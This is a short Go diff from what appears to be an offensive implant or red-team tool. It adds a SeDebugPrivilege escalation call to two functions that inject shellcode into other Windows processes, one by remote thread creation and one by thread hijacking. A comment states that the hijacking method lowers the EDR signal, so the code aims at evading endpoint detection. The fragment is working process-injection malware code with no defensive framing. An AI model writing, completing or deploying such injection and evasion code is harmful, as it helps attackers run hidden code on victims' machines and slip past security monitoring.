@@ -675,6 +675,7 @@ func tokenWhoami() string {
 // ── Remote injection ──────────────────────────────────────────────────────────
 
 func injectRemote(pid int, sc []byte) error {
+	_ = enablePrivilege("SeDebugPrivilege")
 	h, err := windows.OpenProcess(
 		windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|windows.PROCESS_CREATE_THREAD,
 		false, uint32(pid))
@@ -721,6 +722,7 @@ func injectRemote(pid int, sc []byte) error {
 //   • Thread-creation events are NOT generated → lower EDR signal
 
 func injectRemoteHijack(pid int, sc []byte) (string, error) {
+	_ = enablePrivilege("SeDebugPrivilege")
 	hProc, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(pid))
 	if err != nil {
 		return "", fmt.Errorf("OpenProcess(%d): %w", pid, err)
